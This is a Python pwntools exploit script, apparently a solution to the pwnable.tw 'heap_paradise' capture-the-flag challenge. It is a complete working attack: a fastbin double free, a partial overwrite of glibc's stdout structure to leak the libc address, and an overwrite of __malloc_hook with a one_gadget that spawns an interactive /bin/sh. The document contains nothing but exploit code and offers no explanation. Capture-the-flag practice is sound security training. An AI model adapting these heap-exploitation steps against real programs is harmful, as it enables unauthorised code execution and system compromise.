#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g  -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so '.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './heap_paradise'
# execve_file = './heap_paradise.bak'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('chall.pwnable.tw', 10308)
elf = ELF(execve_file)
libc = ELF('./libc-23.so')
# libc = ELF('/glibc/glibc-2.23/debug_x64/lib/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''

    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Allocate(size, data):
	sh.sendlineafter('You Choice:', '1')
	sh.sendlineafter('Size :', str(size))
	sh.sendafter('Data :', data)

def Free(index):
	sh.sendlineafter('You Choice:', '2')
	sh.sendlineafter('Index :', str(index))

Allocate(0x68, 'f' * 0x10 + p64(0) + p64(0x71)) # 0
Allocate(0x68, 'a' * 0x10 + p64(0) + p64(0x31) + 'a' * 0x20 + p64(0) + p64(0x21)) # 1
Free(0)
Free(1)
Free(0)

Allocate(0x68, '\x20') # 2
Allocate(0x68, '\0') # 3
Allocate(0x68, '\0') # 4
Allocate(0x68, '\0') # 5

Free(0)

Allocate(0x68, 'd' * 0x10 + p64(0) + p64(0xa1)) # 6

# unsorted bin
Free(5)

Free(0)
Free(1)

Allocate(0x78, 'f' * 0x40 + p64(0) + p64(0x71) + '\xa0' ) # 7
Free(7)

Allocate(0x68, 'b' * 0x20 + p64(0) + p64(0x71) + p64(libc.symbols['_IO_2_1_stdout_'] - 0x43)[:2]) # 8
# pause()
Allocate(0x68, '\0') # 9

# _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING
Allocate(0x68, '\0' * 3 + p64(0) * 6 + p64(0xfbad2087 + 0x1800) + p64(0) * 3 + '\x80') # 10

if(u64(sh.recvn(8)) != 0):
    raise Exception('no leak')

libc_addr = u64(sh.recvn(8)) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

main_arena_addr = libc_addr + libc.symbols['__malloc_hook'] + 0x10
log.success('main_arena_addr: ' + hex(main_arena_addr))


Free(1)
Allocate(0x78, 'c' * 0x40 + p64(0) + p64(0x71) + p64(main_arena_addr - 0x33)) # 11

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

Allocate(0x68, '\0') # 12
Allocate(0x68, 'z' * 0x13 + p64(libc_addr + 0xef6c4)) # 13

sh.sendlineafter('You Choice:', '1')
sh.sendlineafter('Size :', str(8))

sh.interactive()
clear()

